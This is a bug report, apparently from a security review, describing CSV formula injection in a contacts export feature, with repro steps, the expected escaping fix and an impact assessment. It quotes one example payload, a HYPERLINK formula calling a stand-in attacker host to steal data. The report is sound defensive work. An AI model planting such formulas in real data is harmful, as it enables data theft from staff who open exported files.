## BUG-3 — CSV injection via contact export (formula executes on the exporter's machine)
**Severity: HIGH**

**Repro:**
1. A contact exists whose name is a spreadsheet formula payload (e.g. `=HYPERLINK("http://evil.example/steal...")`).
2. On `/contacts`, click **Export CSV**.
3. Open the downloaded file in Excel or Google Sheets.
4. The formula is preserved unescaped and executes as a live formula instead of showing as plain text.

**Expected:** On export, any cell starting with `=`, `+`, `-`, or `@` must be neutralized (prefixed with `'` or escaped) so spreadsheet software never evaluates it as a formula.

**Actual:** The export writes the field verbatim; the malicious formula runs when the file is opened.

**Who is harmed, how badly, how reversible:**
- **Victim:** the internal agent or admin who exports the file and opens it — not the contact whose data it was.
- **How badly:** attacker-controlled formula execution in the staff member's spreadsheet app (data exfiltration via HYPERLINK/web requests, or in older Excel, command execution). A client-supplied field becomes code on a trusted employee's machine.
- **Reversibility:** poor as a "stop the bleeding" issue — every export already downloaded stays dangerous even after a server-side fix, since the fix doesn't retroactively sanitize files already on disk.
